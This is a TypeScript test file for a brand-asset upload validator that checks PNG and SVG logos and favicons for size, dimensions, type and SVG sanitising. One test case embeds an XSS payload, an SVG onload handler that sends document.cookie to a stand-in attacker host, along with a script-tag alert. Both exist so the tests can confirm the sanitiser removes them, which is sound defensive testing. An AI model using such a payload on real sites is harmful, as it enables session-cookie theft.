import { ACTION_OUTCOME } from '@blog/config';
import { faker } from '@faker-js/faker';
import { SITE_CONFIG_LOG } from '@platform/constants/site-config';
import { UPLOAD_REFUSAL } from '@platform/constants/upload';
import {
  DIMENSION_BOUNDS_PX,
  MAX_UPLOAD_BYTES,
} from '@platform/utils/brand-asset-limits/brand-asset-limits';
import { logger } from '@platform/utils/logger/logger';

import { sanitizeSvgMarkup } from './sanitize-svg-markup';
import { validateBrandAssetUpload } from './validate-brand-asset';

faker.seed(5998);

vi.mock('./sanitize-svg-markup', { spy: true });

const BRAND_ASSET_KIND = { LOGO: 'logo', FAVICON: 'favicon' } as const;
const LOGO_KIND = BRAND_ASSET_KIND.LOGO;
const FAVICON_KIND = BRAND_ASSET_KIND.FAVICON;
const PNG_TYPE = 'image/png';
const SVG_TYPE = 'image/svg+xml';
const SVG_NAMESPACE = 'http://www.w3.org/2000/svg';
const MOCK_PNG_FILENAME = faker.system.commonFileName('png');
const MOCK_SVG_FILENAME = faker.system.commonFileName('svg');
const MOCK_SCRIPT_PAYLOAD = `alert(${faker.lorem.word()})`;
const MOCK_ATTACKER_HOST = faker.internet.domainName();
const MOCK_SANITISER_ERROR_MESSAGE = faker.lorem.words(3);
const MOCK_SQUARE_SIZE = faker.number.int({ min: 64, max: 256 });
const MOCK_WIDE_WIDTH = 300;
const MOCK_WIDE_HEIGHT = 80;
const BELOW_MIN_SIZE = DIMENSION_BOUNDS_PX[LOGO_KIND].min - 1;

const buildPngBuffer = (width: number, height: number): Buffer => {
  const buffer = Buffer.alloc(33);
  buffer.write('\x89PNG\r\n\x1a\n', 0, 'latin1');
  buffer.writeUInt32BE(13, 8);
  buffer.write('IHDR', 12, 'latin1');
  buffer.writeUInt32BE(width, 16);
  buffer.writeUInt32BE(height, 20);
  buffer[24] = 8;
  buffer[25] = 6;
  return buffer;
};

const mockPngFile = (width: number, height: number, paddingBytes = 0) => {
  const bytes = Buffer.concat([
    buildPngBuffer(width, height),
    Buffer.alloc(paddingBytes),
  ]);
  return new File([new Uint8Array(bytes)], MOCK_PNG_FILENAME, {
    type: PNG_TYPE,
  });
};

const mockGifFile = () => {
  const gifBuffer = Buffer.alloc(10);
  gifBuffer.write('GIF89a', 0, 'latin1');
  gifBuffer.writeUInt16LE(MOCK_SQUARE_SIZE, 6);
  gifBuffer.writeUInt16LE(MOCK_SQUARE_SIZE, 8);
  return new File(
    [new Uint8Array(gifBuffer)],
    faker.system.commonFileName('gif'),
    {
      type: 'image/gif',
    },
  );
};

const mockSvgFile = (markup: string) =>
  new File([markup], MOCK_SVG_FILENAME, { type: SVG_TYPE });

const svg = (attributes: string, inner = '') =>
  `<svg xmlns="${SVG_NAMESPACE}"${attributes}>${inner}</svg>`;

const viewBox = (width: number, height: number) =>
  ` viewBox="0 0 ${width} ${height}"`;

const CIRCLE = '<circle cx="12" cy="12" r="10"/>';

const refused = (reason: string, values?: Record<string, unknown>) => ({
  ok: false,
  error: { outcome: ACTION_OUTCOME.REFUSED, reason, ...(values && { values }) },
});

describe(validateBrandAssetUpload, () => {
  it.each([
    {
      scenario: 'a square PNG favicon',
      file: mockPngFile(MOCK_SQUARE_SIZE, MOCK_SQUARE_SIZE),
      kind: FAVICON_KIND,
      contentType: PNG_TYPE,
      extension: 'png',
    },
    {
      scenario: 'a non-square PNG logo',
      file: mockPngFile(MOCK_WIDE_WIDTH, MOCK_WIDE_HEIGHT),
      kind: LOGO_KIND,
      contentType: PNG_TYPE,
      extension: 'png',
    },
    {
      scenario: 'a clean square SVG favicon',
      file: mockSvgFile(svg(viewBox(24, 24), CIRCLE)),
      kind: FAVICON_KIND,
      contentType: SVG_TYPE,
      extension: 'svg',
    },
    {
      scenario: 'a non-square SVG logo',
      file: mockSvgFile(svg(viewBox(MOCK_WIDE_WIDTH, MOCK_WIDE_HEIGHT))),
      kind: LOGO_KIND,
      contentType: SVG_TYPE,
      extension: 'svg',
    },
  ])('accepts $scenario', async ({ file, kind, contentType, extension }) => {
    const result = await validateBrandAssetUpload(file, kind);

    const data = result.ok ? result.data : undefined;
    expect(result.ok).toBe(true);
    expect(data?.buffer).toBeInstanceOf(Buffer);
    expect(data?.contentType).toBe(contentType);
    expect(data?.extension).toBe(extension);
  });

  it.each([
    {
      scenario: 'a non-square favicon naming the actual dimensions',
      file: mockPngFile(MOCK_SQUARE_SIZE, MOCK_SQUARE_SIZE - 1),
      kind: FAVICON_KIND,
      expected: refused(UPLOAD_REFUSAL.FAVICON_NOT_SQUARE, {
        width: MOCK_SQUARE_SIZE,
        height: MOCK_SQUARE_SIZE - 1,
      }),
    },
    {
      scenario: 'an empty file',
      file: new File([], MOCK_PNG_FILENAME, { type: PNG_TYPE }),
      kind: LOGO_KIND,
      expected: refused(UPLOAD_REFUSAL.FILE_MISSING),
    },
    {
      scenario: 'a file over the size limit',
      file: mockPngFile(
        MOCK_SQUARE_SIZE,
        MOCK_SQUARE_SIZE,
        MAX_UPLOAD_BYTES[FAVICON_KIND],
      ),
      kind: FAVICON_KIND,
      expected: refused(UPLOAD_REFUSAL.FILE_TOO_LARGE, { limit: '1.0 MB' }),
    },
    {
      scenario: 'a readable format that is never let through',
      file: mockGifFile(),
      kind: LOGO_KIND,
      expected: refused(UPLOAD_REFUSAL.BRAND_IMAGE_TYPE_UNSUPPORTED),
    },
    {
      scenario: 'a non-square favicon SVG using its viewBox aspect ratio',
      file: mockSvgFile(svg(viewBox(100, 40))),
      kind: FAVICON_KIND,
      expected: refused(UPLOAD_REFUSAL.SVG_FAVICON_NOT_SQUARE, {
        width: 100,
        height: 40,
      }),
    },
    {
      scenario: 'an SVG with no width, height or viewBox',
      file: mockSvgFile(svg('')),
      kind: FAVICON_KIND,
      expected: refused(UPLOAD_REFUSAL.UNREADABLE_IMAGE),
    },
    {
      scenario: 'unreadable bytes behind an image MIME type',
      file: new File([faker.lorem.words(3)], MOCK_PNG_FILENAME, {
        type: PNG_TYPE,
      }),
      kind: LOGO_KIND,
      expected: refused(UPLOAD_REFUSAL.UNREADABLE_IMAGE),
    },
    {
      scenario: 'a logo below the minimum dimension',
      file: mockPngFile(BELOW_MIN_SIZE, BELOW_MIN_SIZE),
      kind: LOGO_KIND,
      expected: refused(UPLOAD_REFUSAL.IMAGE_TOO_SMALL, {
        size: DIMENSION_BOUNDS_PX[LOGO_KIND].min,
      }),
    },
  ])('rejects $scenario', async ({ file, kind, expected }) => {
    const result = await validateBrandAssetUpload(file, kind);

    expect(result).toEqual(expected);
  });

  it.each([
    {
      scenario: 'an embedded script element',
      markup: svg(
        viewBox(24, 24),
        `<script>${MOCK_SCRIPT_PAYLOAD}</script>${CIRCLE}`,
      ),
      kind: LOGO_KIND,
      removed: ['<script', MOCK_SCRIPT_PAYLOAD],
    },
    {
      scenario: 'an onload event-handler attribute',
      markup: svg(
        `${viewBox(24, 24)} onload="fetch('https://${MOCK_ATTACKER_HOST}/'+document.cookie)"`,
        CIRCLE,
      ),
      kind: FAVICON_KIND,
      removed: ['onload', MOCK_ATTACKER_HOST],
    },
  ])(
    'sanitizes $scenario out of an SVG upload',
    async ({ markup, kind, removed }) => {
      const result = await validateBrandAssetUpload(mockSvgFile(markup), kind);

      const written = result.ok
        ? result.data.buffer.toString('utf-8')
        : undefined;
      expect(result.ok).toBe(true);
      for (const text of removed) {
        expect(written).not.toContain(text);
      }
    },
  );

  it('logs once and reports an upload failure when sanitising throws', async () => {
    const cause = new Error(MOCK_SANITISER_ERROR_MESSAGE);
    vi.mocked(sanitizeSvgMarkup).mockRejectedValueOnce(cause);

    const result = await validateBrandAssetUpload(
      mockSvgFile(svg(viewBox(24, 24))),
      LOGO_KIND,
    );

    expect(result).toEqual({
      ok: false,
      error: { outcome: ACTION_OUTCOME.SERVER_ERROR },
    });
    expect(logger.error).toHaveBeenCalledOnce();
    expect(logger.error).toHaveBeenCalledWith(
      SITE_CONFIG_LOG.SVG_SANITIZE_FAILED,
      { kind: LOGO_KIND, error: cause },
    );
  });
});
